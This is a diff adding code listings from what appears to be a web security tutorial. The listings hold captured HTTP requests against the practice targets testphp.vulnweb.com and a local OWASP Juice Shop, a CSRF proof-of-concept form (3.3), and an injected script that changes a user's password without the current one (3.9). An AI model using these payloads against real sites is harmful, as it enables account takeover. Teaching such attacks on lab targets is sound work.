@@ -1,0 +1,154 @@
+//code 3.1
+POST /search.php?test=query HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://testphp.vulnweb.com/search.php?test=query
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 26
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+searchFor=helo&goButton=go
+
+
+----------------
+
+//code 3.2
+POST http://testphp.vulnweb.com/search.php?test=query HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://testphp.vulnweb.com/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 26
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Host: testphp.vulnweb.com
+
+searchFor=helo&goButton=go
+
+
+----------------------
+
+//code 3.3
+<html>
+<body>
+<script>history.pushState('', '', '/')</script>
+<form action="http://testphp.vulnweb.com/search.php?test=query" method="post"> 
+       <input type="hidden" name="searchFor" value="CSRF"> 
+      <input type="hidden" name="goButton" value="go"> 
+      <input type="submit" value="Submit Request"> 
+    </form> 
+</body>
+</html>
+
+------------------
+
+//code 3.4
+POST /search.php?test=query HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 26
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+searchFor=CSRF&goButton=go
+
+
+-------------------------
+
+//code 3.5
+root@kali:~/Downloads# cd juice-shop_8.7.2/
+root@kali:~/Downloads/juice-shop_8.7.2# npm start
+
+> juice-shop@8.7.2 start /root/Downloads/juice-shop_8.7.2
+> node app
+
+info: All dependencies in ./package.json are satisfied (OK)
+info: Detected Node.js version v10.16.0 (OK)
+info: Detected OS linux (OK)
+info: Detected CPU x64 (OK)
+info: Required file index.html is present (OK)
+info: Required file main.js is present (OK)
+info: Required file polyfills.js is present (OK)
+info: Required file runtime.js is present (OK)
+info: Required file vendor.js is present (OK)
+info: Configuration default validated (OK)
+info: Port 3000 is available (OK)
+info: Server listening on port 3000
+
+
+-------------------
+
+//code 3.6
+GET /rest/user/change-password?current=P@ssword&new=password123&repeat=password123 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:3000/
+Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTUsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJmb29AYmFyLmNvbSIsInBhc3N3b3JkIjoiMzgyZTAzNjBlNGViN2I3MDAzNGZiYWE2OWJlYzU3ODYiLCJpc0FkbWluIjpmYWxzZSwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMTktMDYtMjAgMDE6MDk6NDMuMjcwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTktMDYtMjAgMDE6MDk6NDMuMjcwICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTU2MDk5MzAwMCwiZXhwIjoxNTYxMDExMDAwfQ.JZYZzCAgPEkbGA9aRIKKKrMue9lnZBkNkyXbP86TXn40sT6k3yP-6kVejmGvyM5UNBd0iXpTOmkaG9tZefEoIqsm7D7tb6gxvJcdP2s6RrS0BSTH2w32WZ46xaFt4EVCFGqMYUeOVkbL-U1UtVJUaf-IVm66lzk29njHtz4Lo_g
+Cookie: language=en; io=Unq26SseBmTY8sRrAAAC; welcome-banner-status=dismiss; token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTUsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJmb29AYmFyLmNvbSIsInBhc3N3b3JkIjoiMzgyZTAzNjBlNGViN2I3MDAzNGZiYWE2OWJlYzU3ODYiLCJpc0FkbWluIjpmYWxzZSwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMTktMDYtMjAgMDE6MDk6NDMuMjcwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTktMDYtMjAgMDE6MDk6NDMuMjcwICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTU2MDk5MzAwMCwiZXhwIjoxNTYxMDExMDAwfQ.JZYZzCAgPEkbGA9aRIKKKrMue9lnZBkNkyXbP86TXn40sT6k3yP-6kVejmGvyM5UNBd0iXpTOmkaG9tZefEoIqsm7D7tb6gxvJcdP2s6RrS0BSTH2w32WZ46xaFt4EVCFGqMYUeOVkbL-U1UtVJUaf-IVm66lzk29njHtz4Lo_g; cookieconsent_status=dismiss; continueCode=6DyMwXxlmzZRy9EWqoBKPLew2Or6dwo1d4b15M3aQvYVkgnpj87XNDJKPVJL
+DNT: 1
+Connection: close
+
+--------------------------
+
+//code 3.7
+HTTP/1.1 401 Unauthorized
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Type: text/html; charset=utf-8
+Content-Length: 32
+ETag: W/"20-6tKKLCLLgOnzR5qInvJyo/E13vg"
+Vary: Accept-Encoding
+Date: Thu, 20 Jun 2019 01:28:22 GMT
+Connection: close
+
+Current password is not correct.
+
+
+----------------------------
+
+//code 3.8
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Type: application/json; charset=utf-8
+Content-Length: 302
+ETag: W/"12e-UI0HnPP2ynY8xMCFiTvRctgcM9A"
+Vary: Accept-Encoding
+Date: Thu, 20 Jun 2019 01:34:56 GMT
+Connection: close
+
+{"user":{"id":15,"username":"Sanjib","email":"foo@bar.com","password":"32250170a0dca92d53ec9624f336ca24","isAdmin":false,"lastLoginIp":"0.0.0.0","profileImage":"default.svg","totpSecret":"","isActive":true,"createdAt":"2019-06-20T01:09:43.270Z","updatedAt":"2019-06-20T01:34:56.417Z","deletedAt":null}}
+
+
+-----------------------------------
+
+//code 3.9
+<script>
+xmlhttp = XMLHttpRequest;
+xmlhttp.open('Get', 'http://localhost:3000/rest/user/change-password?new=pass12345&repeat=pass12345');
+xmlhttp.send();
+</script>
+
+----------------------------------
+
+
+
